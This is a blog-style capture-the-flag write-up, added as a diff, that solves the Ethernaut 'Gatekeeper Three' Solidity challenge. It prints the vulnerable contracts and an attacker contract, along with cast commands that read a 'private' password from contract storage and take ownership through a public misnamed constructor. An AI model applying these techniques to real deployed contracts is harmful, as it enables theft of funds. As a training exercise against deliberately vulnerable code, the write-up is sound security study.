@@ -1,0 +1,165 @@
+---
+title: Ethernaut - Gatekeeper Three - Solution
+date: '2024-06-09'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Gatekeeper Three CTF
+---
+
+# Ethernaut - Gatekeeper Three - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+    GatekeeperThree public target;
+    address public trick;
+    uint256 private password = block.timestamp;
+
+    constructor(address payable _target) {
+        target = GatekeeperThree(_target);
+    }
+
+    function checkPassword(uint256 _password) public returns (bool) {
+        if (_password == password) {
+            return true;
+        }
+        password = block.timestamp;
+        return false;
+    }
+
+    function trickInit() public {
+        trick = address(this);
+    }
+
+    function trickyTrick() public {
+        if (address(this) == msg.sender && address(this) != trick) {
+            target.getAllowance(password);
+        }
+    }
+}
+
+contract GatekeeperThree {
+    address public owner;
+    address public entrant;
+    bool public allowEntrance;
+
+    SimpleTrick public trick;
+
+    function construct0r() public {
+        owner = msg.sender;
+    }
+
+    modifier gateOne() {
+        require(msg.sender == owner);
+        require(tx.origin != owner);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(allowEntrance == true);
+        _;
+    }
+
+    modifier gateThree() {
+        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+            _;
+        }
+    }
+
+    function getAllowance(uint256 _password) public {
+        if (trick.checkPassword(_password)) {
+            allowEntrance = true;
+        }
+    }
+
+    function createTrick() public {
+        trick = new SimpleTrick(payable(address(this)));
+        trick.trickInit();
+    }
+
+    function enter() public gateOne gateTwo gateThree {
+        entrant = tx.origin;
+    }
+
+    receive() external payable {}
+}
+```
+
+## Solution
+
+The goal of this level is to register yourself as an `entrant`.
+
+To solve the challenge, we can use the following attacker contract:
+
+```solidity 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperThree {
+    function construct0r() external;
+    function enter() external;
+}
+
+contract GatekeeperThreeAttacker {
+    IGatekeeperThree public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = IGatekeeperThree(victim);
+    }
+
+    function becomeOwner() external {
+        VICTIM.construct0r();
+    }
+
+    function enter() external {
+        VICTIM.enter();
+    }
+
+    receive() external payable {
+        revert("No donations pls");
+    }
+}
+```
+
+After deploying this contract, we can use its `becomeOwner()` function to claim ownership of the victim.
+This will allow us to pass `gateOne()`.
+
+To pass `gateTwo()`, we must call `getAllowance()` with the correct password.
+By looking at the level's code, we can see that we first need to create a `SimpleTrick` contract using the `createTrick()` function.
+This is easily achieved via the Ethernaut console:
+
+```javascript
+await contract.createTrick()
+```
+
+Next, we can determine `SimpleTrick`'s address via:
+
+```javascript
+await contract.trick()
+```
+
+In my case, it's 0x2379f9794f70B7384f6Ea9baeDC5A212daF9c9E2.
+Knowing this address, we can now inspect `SimpleTrick`'s third storage slot, which contains the "private" password:
+
+```bash
+cast storage 0x2379f9794f70B7384f6Ea9baeDC5A212daF9c9E2 2 --rpc-url $SEP_RPC_URL
+# Result: 0x000000000000000000000000000000000000000000000000000000006665ed70
+```
+
+Since `getAllowance()` requires us to provide the password as a `uint256`, we need to convert this output accordingly:
+
+```bash
+cast to-dec 0x000000000000000000000000000000000000000000000000000000006665ed70
+# Result: 1717955952
+```
+
+We can now call `getAllowance()`, passing in 1717955952 for the `password` parameter.
+
+Now, to pass first condition of the third gate, we send 0.0011 ether to the level instance (e.g., using MetaMask).
+The reverting `receive()` function we included in our attacker ensures that we also pass the second condition. 
+
+Finally, we can call `enter()` on our attacker contract to complete the challenge.
